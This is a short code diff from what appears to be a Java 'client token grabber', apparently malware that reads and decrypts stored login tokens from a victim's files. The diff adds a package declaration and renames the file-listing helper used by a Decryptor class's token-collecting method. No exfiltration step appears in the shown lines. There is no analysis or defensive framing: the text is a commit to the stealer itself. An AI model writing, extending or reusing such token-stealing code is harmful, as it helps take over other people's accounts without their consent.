@@ -1,3 +1,5 @@
+package main.java.clienttokengrabber.utils;
+
 import java.util.*;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -69,7 +71,7 @@ public class Decryptor {
     private static List<byte[]> listTokens(String path) {
         List<byte[]> newTokens = new ArrayList<>();
 
-        DefaultPaths.listValidFiles(path).forEach(file ->
+        FileManager.listValidFiles(path).forEach(file ->
             newTokens.addAll(decodeTokens(file))
         );
 
